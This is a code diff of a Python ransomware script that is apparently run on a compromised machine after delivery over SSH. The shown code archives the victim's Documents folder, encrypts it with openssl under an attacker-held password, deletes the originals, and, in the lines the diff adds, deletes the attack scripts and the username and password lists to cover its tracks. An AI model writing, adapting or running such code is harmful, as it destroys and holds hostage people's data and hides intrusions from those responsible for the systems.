@@ -1,9 +1,8 @@
-""" Program to run on remote system after being transferred onto it. Downloads OpenSSL 
+""" Program to run on remote system after being transferred onto it. Downloads OpenSSL
     and uses it to encrypt target system. Also leaves a silly note. """
 import sys
 import os
 import urllib
-import argparse
 import tarfile
 from subprocess import call
 
@@ -18,8 +17,8 @@ def encrypt_directory(target_dir, password):
     tar = tarfile.open("ineedmoney.tar", "w:gz")
     tar.add("Documents/")
     tar.close()
-    call(("openssl enc -aes-256-cbc -in ineedmoney.tar -out ineedmoneyplz.tar -pass pass:" 
-          + password).split(" "))
+    call(("openssl enc -aes-256-cbc -in ineedmoney.tar -out ineedmoneyplz.tar -pass pass:" +
+          password).split(" "))
     call("rm ineedmoney.tar".split(" "))
     call("rm -r Documents/".split(" "))
 
@@ -39,11 +38,9 @@ def main():
         # Don't need to do anything. Add exception handling later?
         pass
     finally:
-        #call("rm local_attack.py".split(" "))
-        #call("rm ransom.py usernames.txt passwords.txt SSHConnection.py SSHConnection.pyc local_attack.py".split(" "))
-        pass
-    with open("finishedPhase2.txt", "w") as output:
-        output.write("finished local_attack.py")
+        call("rm local_attack.py".split(" "))
+        call("rm ransom.py usernames.txt passwords.txt".split(" "))
+        call("rm SSHConnection.py SSHConnection.pyc".split(" "))
 
 if __name__ == "__main__":
     main()
